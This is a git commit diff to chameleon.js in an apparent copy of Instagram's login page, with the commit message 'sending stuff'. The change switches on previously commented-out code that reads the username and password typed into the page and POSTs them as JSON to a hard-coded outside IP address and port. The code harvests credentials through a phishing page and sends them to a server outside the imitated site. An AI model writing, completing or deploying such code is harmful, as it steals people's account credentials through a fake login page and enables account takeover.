1b6bfb31206126cbec51711485ac7b73b41f8d94
IsaiahWitzke <isaiah.witzke@gmail.com>
2020-02-22 12:45:00 -0500

    sending stuff

--- Instagram_files/chameleon.js
+++ Instagram_files/chameleon.js
@@ -33,15 +33,11 @@ function logInOnClick() {
     var usernameInputText = document.getElementById("username-input-box").value;
     var passwordInputText = document.getElementById("password-input-box").value;
     alert(usernameInputText + ", " + passwordInputText);
-    // send a post to a webserver running on home machine
-    /*
     const xhr = new XMLHttpRequest();
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", yourUrl, true);
+    xhr.open("POST", "23.233.39.254:3000", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.send(JSON.stringify({
         username: usernameInputText,
         passowrd: passwordInputText
     }));
-    */
 }
